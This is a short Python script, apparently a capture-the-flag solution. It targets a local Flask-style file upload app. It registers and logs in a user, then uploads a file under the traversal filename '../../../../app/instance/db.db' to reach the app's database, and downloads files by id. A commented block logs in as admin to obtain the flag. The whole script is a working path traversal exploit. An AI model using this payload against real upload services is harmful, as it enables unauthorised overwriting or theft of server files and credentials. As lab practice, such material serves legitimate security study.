import requests

BASE_URL = 'http://localhost:5000'

session = requests.Session()

def register(username, password):
    url = f"{BASE_URL}/register"
    payload = {'username': username, 'password': password}
    response = session.post(url, json=payload)
    print(f"Register: {response.status_code} - {response.json()}")

def login(username, password):
    url = f"{BASE_URL}/login"
    payload = {'username': username, 'password': password}
    response = session.post(url, json=payload)
    print(response.cookies)
    print(f"Login: {response.status_code} - {response.json()}")

def upload_file(file_path, new_filename=None):
    url = f"{BASE_URL}/upload"
    files = {'file': (new_filename if new_filename else file_path.split('/')[-1], open(file_path, 'rb'))}
    response = session.post(url, files=files)
    print(f"Upload: {response.status_code} - {response.json()}")

def list_files():
    url = f"{BASE_URL}/files"
    response = session.get(url)
    print(f"List Files: {response.status_code} - {response.json()}")

def view_file(file_id):
    url = f"{BASE_URL}/file/{file_id}"
    response = session.get(url)
    if response.status_code == 200:
        with open(f"downloaded_{file_id}.file", 'wb') as f:
            f.write(response.content)
        print(f"File {file_id} downloaded successfully.")
    else:
        print(f"View File: {response.status_code} - {response.json()}")

def admin_access():
    url = f"{BASE_URL}/admin"
    response = session.get(url)
    print(f"Admin Access: {response.status_code} - {response.text}")

if __name__ == "__main__":
    register('random', 'random')
    login('random', 'random')
    
    file_path = './random.txt'
    new_filename = '../../../../app/instance/db.db'
    upload_file(file_path, new_filename)

    list_files()
    view_file(1)
    

"""
Run to get the flag
"""
# if __name__ == "__main__":
#     login('admin', '') # Insert admin password here
    
#     admin_access()

